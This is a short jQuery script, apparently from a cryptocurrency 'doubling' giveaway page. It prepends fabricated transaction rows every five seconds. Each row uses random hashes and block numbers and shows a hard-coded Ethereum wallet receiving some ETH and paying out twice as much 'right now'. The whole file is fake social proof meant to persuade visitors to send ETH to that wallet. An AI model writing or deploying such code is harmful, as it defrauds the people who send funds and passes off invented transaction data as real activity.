$(function () {
    const BaseWallet = "0x93935082b15c56b90C09f9ab74eC845AF4c6254E";

    function createTableItem() {
        let inputValue = randomInteger(1,700) + "." + randomString(1, "123456789");
        let outputValue = ++inputValue * 2;
        let txFIn = inputValue / 1000;
        let txFOut = outputValue / 1000;
        let cutWallet = BaseWallet;

        let row = `
            <div class="table-row">
                <div class="table-row_content">
                    <div class="table-row_line">
                        <p class="address">${randomString(25) + "..."}</p>
                        <p class="block">${randomString(6, "123456789")}</p>
                        <p class="address">${cutWallet}</p>
                    </div>
                    <hr class="table-row_hr">
                    <div class="table-row_line">
                        <p class="address">${randomString(25) + "..."}</p>
                        <p class="block">${randomString(6, "123456789")}</p>
                        <p class="address">${randomString(25) + "..."}</p>
                    </div>
                </div>
                <div class="table-row_separator">
                    <p>OUT</p>
                    <img src="img/check.png" alt="">
                    <p>IN</p>
                </div>
                <div class="table-row_content">
                    <div class="table-row_line">
                        <p class="address">${randomString(25) + "..."}</p>
                        <p class="age">right now</p>
                        <p class="value">${outputValue + "  ETH"}</p>
                        <p class="txfee">${txFOut.toFixed(3)}</p>
                    </div>
                    <hr class="table-row_hr">
                    <div class="table-row_line">
                        <p class="address">${cutWallet}</p>
                        <p class="age">right now</p>
                        <p class="value">${inputValue + "  ETH"}</p>
                        <p class="txfee">${txFIn.toFixed(3)}</p>
                    </div>
                </div>
            </div>`;

        $(row).hide().prependTo(".table-items").fadeIn("slow");
        $('.table-row:eq(3)').remove();
    }

    createTableItem();
    createTableItem();
    createTableItem();

    setInterval(createTableItem, 5000);
});